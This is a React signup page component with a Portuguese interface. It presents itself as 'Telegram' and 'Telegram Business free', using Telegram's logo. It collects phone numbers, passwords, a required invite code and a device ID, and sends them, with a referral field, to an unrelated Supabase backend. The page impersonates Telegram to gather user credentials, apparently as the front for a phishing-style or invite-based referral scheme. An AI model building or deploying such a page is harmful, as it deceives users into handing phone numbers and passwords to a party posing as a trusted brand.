import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { useToast } from '../components/Toast';
import { supabase } from '../lib/supabase';
import { getDeviceId } from '../lib/device';
import { subscribeToPushNotifications } from '../lib/pushNotifications';
import { Loader2, Search, X, Check, Copy, Eye, EyeOff, ChevronDown } from 'lucide-react';
import { COUNTRIES, Country } from '../lib/countries';

export default function Messager() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { showToast } = useToast();

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({ phone: '', inviteCode: '' });


  const [showPasskeyDialog, setShowPasskeyDialog] = useState(false);
  const [generatedPasskey, setGeneratedPasskey] = useState('');
  const [passkeyDialogCopied, setPasskeyDialogCopied] = useState(false);

  const [selectedCountry, setSelectedCountry] = useState<Country>(COUNTRIES[0]);
  const [showCountryModal, setShowCountryModal] = useState(false);
  const [searchCountry, setSearchCountry] = useState('');
  
  const [userPasskey, setUserPasskey] = useState('');
  const [showUserPasskey, setShowUserPasskey] = useState(false);

  useEffect(() => {
    let code = searchParams.get('join') || searchParams.get('invite') || searchParams.get('code') || searchParams.get('ref');

    if (!code) {
      const rawSearch = window.location.search ? window.location.search.replace(/^\?/, '').trim() : '';
      if (rawSearch) {
        code = rawSearch.includes('=') ? rawSearch.split('=')[1] : rawSearch;
      }
    }

    if (code) {
      const cleanCode = code.trim().slice(0, 6);
      setFormData(prev => ({ ...prev, inviteCode: cleanCode }));
    }
  }, [searchParams]);

  const handleChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let sanitized = value;
    if (name === 'phone') {
      sanitized = value.replace(/\D/g, '').slice(0, selectedCountry.maxLength);
    }
    setFormData(prev => ({ ...prev, [name]: sanitized }));
  }, [selectedCountry.maxLength]);


  const executeRegistration = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.phone || formData.phone.length < 6) {
      showToast(`Por favor, insira um número de telefone válido.`, 'error');
      return;
    }

    if (!userPasskey || userPasskey.trim().length < 6) {
      showToast('Por favor, insira uma senha com no mínimo 6 caracteres.', 'error');
      return;
    }

    if (!formData.inviteCode || formData.inviteCode.trim().length < 3) {
      showToast('Por favor, insira o código de convite.', 'error');
      return;
    }


    setIsSubmitting(true);
    try {
      const { data: rpcData, error: vError } = await supabase.rpc('secure_registration_mcpn', {
          p_phone: formData.phone,
          p_invite_code: formData.inviteCode,
          p_device_id: getDeviceId()
        });

        if (vError) {
          throw vError;
        }

        const validation = rpcData as { success: boolean; message: string } | null;
        if (validation && !validation.success) {
          showToast(validation.message || 'Ops! Código de convite inválido ou expirado.', 'error');
          setIsSubmitting(false);
          return;
        }


        const { data, error } = await supabase.functions.invoke('auth-proxy', {
          body: {
            action: 'signup',
            phone: formData.phone,
            password: userPasskey,
            options: {
              data: {
                phone: formData.phone,
                referred_by: formData.inviteCode,
                device_id: getDeviceId()
              }
            }
          },
        });

        if (data?.session) {
          await supabase.auth.setSession({
            access_token: data.session.access_token,
            refresh_token: data.session.refresh_token,
          });
        }

        if (error) {
          if (error.message.includes('already registered') || error.message.includes('User already registered')) {
            showToast('Ops! Este número de telefone já está cadastrado. Conecte-se.', 'error');
          } else {
            throw error;
          }
          return;
        }

        if (data.user) {
          if ('Notification' in window && Notification.permission === 'granted') {
            subscribeToPushNotifications().catch(() => { });
          }
          localStorage.setItem('saved_country_name', selectedCountry.name);
          setGeneratedPasskey(userPasskey);
          setShowPasskeyDialog(true);
        }
      } catch (err: any) {
        let msg = err.message || 'Ops! Ocorreu um erro ao processar o cadastro.';
        if (msg.includes('email rate limit exceeded')) msg = 'Ops! Limite de tentativas excedido, tente mais tarde.';
        showToast(msg, 'error');
      } finally {
        setIsSubmitting(false);
      }
    };


    const handlePasskeyDialogClose = () => {
      setShowPasskeyDialog(false);
      navigate('/login');
    };

    const handleCopyPasskey = async () => {
      try {
        await navigator.clipboard.writeText(generatedPasskey);
        setPasskeyDialogCopied(true);
        setTimeout(() => setPasskeyDialogCopied(false), 2500);
      } catch {
        showToast('Não foi possível copiar. Anote a senha manualmente.', 'error');
      }
    };

    const filteredCountries = useMemo(() => {
      if (!searchCountry) return COUNTRIES;
      return COUNTRIES.filter(c =>
        c.name.toLowerCase().includes(searchCountry.toLowerCase()) ||
        c.dial_code.includes(searchCountry)
      );
    }, [searchCountry]);

    return (
      <div className="w-full min-h-screen bg-white pb-12 font-sans antialiased text-black select-none flex flex-col items-center justify-center p-4">
        <main className="w-full max-w-[340px] sm:max-w-[360px] flex flex-col items-center">

          <div className="mb-3.5 flex items-center justify-center">
            <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" className="w-[58px] h-[58px]">
              <defs>
                <linearGradient id="tgOfficialGrad" x1=".667" x2=".417" y1=".167" y2=".75">
                  <stop offset="0" stopColor="#37aee2" />
                  <stop offset="1" stopColor="#1e96c8" />
                </linearGradient>
              </defs>
              <circle cx="120" cy="120" r="120" fill="url(#tgOfficialGrad)" />
              <path fill="#c8daea" d="m98 175c-3.888 0-3.227-1.468-4.568-5.17l-11.433-37.594 88.022-52.232" />
              <path fill="#a9c9dd" d="m98 175c3 0 4.325-1.372 6-3l16-15.558-19.958-12.035" />
              <path fill="#fff" d="m100.04 144.41 48.36 35.729c5.519 3.045 9.501 1.468 10.876-5.123l19.685-92.763c2.015-8.08-3.08-11.746-8.36-9.349l-115.59 44.571c-7.89 3.165-7.843 7.567-1.438 9.528l29.663 9.259 68.673-43.325c3.242-1.966 6.218-.91 3.776 1.258" />
            </svg>
          </div>

          <h1 className="text-[26px] font-bold text-center mb-1.5 tracking-tight text-[#1c1c1e]">
            Telegram
          </h1>

          <p className="text-[13px] text-[#8e8e93] text-center mb-6 leading-snug max-w-[290px]">
            Bem-vindo ao Telegram Business free, inscreva-se gratuitamente
          </p>

          <form onSubmit={executeRegistration} className="w-full flex flex-col gap-4">
            <div className="w-full flex flex-col gap-5 mt-2">
            <div className="relative w-full">
              <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
                <label className="text-[14px] text-[#707579] font-medium leading-none">Country</label>
              </div>
              <button
                type="button"
                onClick={() => setShowCountryModal(true)}
                style={{ borderRadius: '12px' }}
                className="w-full h-[54px] auth-input-btn border border-[#dfdfe0] bg-white flex items-center justify-between px-3.5 hover:border-[#3390ec] focus:border-[#3390ec] focus:outline-none transition-colors cursor-pointer"
                title="Mudar país"
              >
                <span className="text-[16px] text-black font-normal">{selectedCountry.name}</span>
                <ChevronDown className="w-5 h-5 text-[#a2a6aa]" strokeWidth={2} />
              </button>
            </div>

            <div className="relative w-full">
              <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
                <label className="text-[14px] text-[#707579] font-medium leading-none">Your phone number</label>
              </div>
              <div style={{ borderRadius: '12px' }} className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
                <span className="text-[16px] text-black mr-1.5">{selectedCountry.dial_code}</span>
                <input
                  name="phone"
                  type="tel"
                  inputMode="numeric"
                  autoComplete="tel"
                  className="flex-1 bg-transparent outline-none text-[16px] text-black font-normal h-full w-full"
                  value={formData.phone}
                  onChange={handleChange}
                  maxLength={selectedCountry.maxLength}
                />
              </div>
            </div>

            <div className="relative w-full">
              <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
                <label className="text-[14px] text-[#707579] font-medium leading-none">Password</label>
              </div>
              <div style={{ borderRadius: '12px' }} className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
                <input
                  name="userPasskey"
                  type={showUserPasskey ? 'text' : 'password'}
                  className="flex-1 bg-transparent outline-none text-[16px] text-black font-normal h-full w-full"
                  value={userPasskey}
                  onChange={(e) => setUserPasskey(e.target.value)}
                  autoComplete="new-password"
                />
                <button
                  type="button"
                  onClick={() => setShowUserPasskey(v => !v)}
                  className="ml-2 text-[#a2a6aa] hover:text-[#3390ec] transition-colors shrink-0"
                  aria-label={showUserPasskey ? 'Ocultar senha' : 'Ver senha'}
                >
                  {showUserPasskey ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            <div className="relative w-full">
              <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
                <label className="text-[14px] text-[#707579] font-medium leading-none">Invite Code</label>
              </div>
              <div style={{ borderRadius: '12px' }} className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
                <input
                  name="inviteCode"
                  type="text"
                  className="flex-1 bg-transparent outline-none text-[16px] text-black font-normal h-full w-full"
                  value={formData.inviteCode}
                  onChange={handleChange}
                  maxLength={10}
                />
              </div>
            </div>


          </div>

          <div className="w-full pt-1 space-y-2.5">
            <button
              type="submit"
              disabled={isSubmitting}
              style={{ borderRadius: '12px' }}
              className="w-full h-[48px] btn-auth bg-[#3390ec] hover:bg-[#2881dc] active:scale-[0.98] text-white font-semibold text-[15px] transition-all disabled:opacity-50 flex items-center justify-center cursor-pointer"
            >
              {isSubmitting ? <Loader2 className="animate-spin h-5 w-5 text-white" /> : 'Inscrever-se'}
            </button>

            <button
              type="button"
              onClick={() => navigate('/login')}
              className="w-full text-center text-[#3390ec] hover:text-[#2881dc] font-medium text-[14.5px] transition-colors py-2 cursor-pointer hover:underline"
            >
              Já tenho conta — Conectar-se
            </button>
          </div>
        </form>
      </main>

      {
      showPasskeyDialog && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/50 p-4">
          <div className="bg-white w-full max-w-[340px] rounded-[24px] shadow-2xl p-6 flex flex-col items-center text-center">
            <p className="text-[13px] text-[#707579] leading-snug mb-4 max-w-[260px]">
              Esta é a sua senha de acesso. Guarde-a para entrar na sua conta.
            </p>
            <div className="w-full bg-[#f0f7ff] border-2 border-[#3390ec] rounded-[18px] px-5 py-4 flex items-center justify-between mb-2">
              <span className="text-[24px] font-black text-[#3390ec] tracking-[4px] font-mono flex-1 text-center truncate">
                {generatedPasskey}
              </span>
              <button
                onClick={handleCopyPasskey}
                className={`ml-2 p-2.5 rounded-[12px] transition-all active:scale-95 shrink-0 ${passkeyDialogCopied
                    ? 'bg-green-100 text-green-600'
                    : 'bg-[#3390ec]/10 text-[#3390ec] hover:bg-[#3390ec]/20'
                  }`}
                title="Copiar senha"
              >
                {passkeyDialogCopied ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
              </button>
            </div>

            {passkeyDialogCopied && (
              <p className="text-[12px] text-green-600 font-semibold mb-2">✓ Copiado para a área de transferência!</p>
            )}

            <p className="text-[11px] text-[#a2acb4] mb-5 leading-snug">
              Número registrado:{' '}
              <strong className="text-[#707579]">
                {selectedCountry.dial_code} {formData.phone}
              </strong>
            </p>

            <button
              onClick={handlePasskeyDialogClose}
              className="w-full h-[46px] rounded-[22px] bg-[#3390ec] hover:bg-[#2b7bc9] text-white font-semibold text-[14px] uppercase tracking-wider transition-all active:scale-[0.98] shadow-sm"
            >
              ENTRAR NA MINHA CONTA
            </button>
          </div>
        </div>
      )
    }

    {
      showCountryModal && (
        <div className="fixed inset-0 z-[200] bg-white flex flex-col">
          <div className="h-[56px] px-4 flex items-center border-b border-[#c8c7cc] shrink-0 bg-[#f8f8f8]">
            <button onClick={() => setShowCountryModal(false)} className="text-[#3390ec] text-[17px] font-medium cursor-pointer">
              Voltar
            </button>
            <h2 className="flex-1 text-center text-[17px] font-semibold">Escolha um país</h2>
            <div className="w-[40px]" />
          </div>
          <div className="p-2 bg-[#f8f8f8] border-b border-[#c8c7cc] shrink-0">
            <div className="bg-[#e3e3e8] h-[36px] rounded-[20px] flex items-center px-3">
              <Search className="w-5 h-5 text-[#8e8e93] mr-2" />
              <input
                type="text"
                placeholder="Pesquisar país ou código"
                className="bg-transparent outline-none flex-1 text-[16px] text-black"
                value={searchCountry}
                onChange={(e) => setSearchCountry(e.target.value)}
              />
              {searchCountry && (
                <button onClick={() => setSearchCountry('')} className="bg-[#8e8e93] text-white rounded-full p-0.5 ml-2 cursor-pointer">
                  <X className="w-3 h-3" />
                </button>
              )}
            </div>
          </div>
          <div className="flex-1 overflow-y-auto">
            {filteredCountries.map((c) => (
              <div
                key={c.code}
                className="flex items-center px-4 h-[50px] border-b border-[#c8c7cc] active:bg-gray-100 cursor-pointer"
                onClick={() => {
                  setSelectedCountry(c);
                  setFormData(prev => ({ ...prev, phone: '' }));
                  setShowCountryModal(false);
                  setSearchCountry('');
                }}
              >
                <img
                  src={`https://flagcdn.com/w40/${c.code.toLowerCase()}.png`}
                  alt={c.name}
                  className="w-8 h-auto rounded-sm object-cover mr-3 shrink-0"
                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
                />
                <span className="flex-1 text-[17px] font-medium text-black">{c.name}</span>
                <span className="text-[#8e8e93] text-[17px] mr-2">{c.dial_code}</span>
                {selectedCountry.code === c.code && <Check className="w-5 h-5 text-[#3390ec]" />}
              </div>
            ))}
            {filteredCountries.length === 0 && (
              <div className="p-8 text-center text-[#8e8e93]">Nenhum país encontrado</div>
            )}
          </div>
        </div>
      )
    }
    </div >
  );
}
